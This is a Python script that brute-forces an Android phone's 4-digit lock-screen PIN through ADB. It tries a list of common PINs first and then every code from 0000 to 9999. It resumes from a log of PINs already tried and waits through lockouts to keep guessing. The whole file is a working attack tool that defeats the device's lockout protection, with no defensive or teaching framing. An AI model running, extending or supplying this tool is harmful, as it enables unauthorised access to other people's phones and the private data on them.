import sys
import time
import os
from adb_utils import device_connected, enter_pin, is_unlocked, is_locked_out
from config import LOG_FILE, COMMON_PINS_FILE, ATTEMPT_DELAY, LOCKOUT_BACKOFF


def log(msg: str):
    os.makedirs(os.path.dirname(LOG_FILE), exist_ok=True)
    with open(LOG_FILE, "a") as f:
        f.write(f"{time.strftime('%H:%M:%S')}  {msg}\n")
    print(msg)


def load_common_pins() -> list:
    with open(COMMON_PINS_FILE) as f:
        return [line.strip() for line in f if line.strip()]


def already_tried_pins() -> set:
    tried = set()
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE) as f:
            for line in f:
                if "Trying PIN:" in line:
                    tried.add(line.strip().split()[-1])
    return tried


def all_pins_sequential(exclude: set):
    for i in range(10000):
        pin = f"{i:04d}"
        if pin not in exclude:
            yield pin


def try_pin(pin: str) -> bool:
    log(f"[*] Trying PIN: {pin}")
    enter_pin(pin)
    time.sleep(ATTEMPT_DELAY)

    if is_unlocked():
        log(f"[+] SUCCESS! PIN is: {pin}")
        return True

    if is_locked_out():
        log(f"[!] Lockout detected after {pin}, backing off {LOCKOUT_BACKOFF}s")
        time.sleep(LOCKOUT_BACKOFF)

    return False


def brute_force():
    tried = already_tried_pins()
    if tried:
        log(f"[*] Resuming — {len(tried)} PINs already attempted previously.")

    common_pins = load_common_pins()

    log("=== Phase 1: Common PIN list ===")
    for pin in common_pins:
        if pin in tried:
            continue
        if try_pin(pin):
            return pin

    log("=== Phase 2: Full sequential sweep ===")
    exclude = tried.union(common_pins)
    for pin in all_pins_sequential(exclude):
        if try_pin(pin):
            return pin

    log("[-] Exhausted all combinations without success.")
    return None

if __name__ == "__main__":
    if not device_connected():
        print("[!] No device detected. Run `adb devices` and check USB connection.")
        exit(1)

    print("[*] Device connected.")

    if "--manual" in sys.argv:
        idx = sys.argv.index("--manual")
        pin = sys.argv[idx + 1]
        print(f"[*] Trying manual PIN: {pin}")
        if try_pin(pin):
            print(f"[+] SUCCESS! PIN is: {pin}")
        else:
            print(f"[-] PIN {pin} failed.")

    elif "--common-only" in sys.argv:
        tried = already_tried_pins()
        common_pins = load_common_pins()
        log("=== Common PIN list only ===")
        found = None
        for pin in common_pins:
            if pin in tried:
                continue
            if try_pin(pin):
                found = pin
                break
        if not found:
            log("[-] No match found in common PIN list.")

    else:  # --full or no arg, default to full
        input("Press Enter to begin full brute-force (common PINs first)...")
        brute_force()

